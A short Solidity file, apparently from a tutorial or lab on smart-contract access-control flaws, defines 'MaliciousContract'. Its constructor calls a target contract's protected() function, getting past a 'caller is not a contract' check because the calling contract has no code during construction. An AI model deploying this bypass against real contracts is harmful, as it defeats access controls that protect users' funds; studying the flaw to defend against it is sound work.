// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Bypasscontrol.sol";

contract MaliciousContract {
    Target public targetContract;

    constructor(address _targetAddress) {
        targetContract = Target(_targetAddress);
        targetContract.protected(); // Call the protected function during construction
    }
}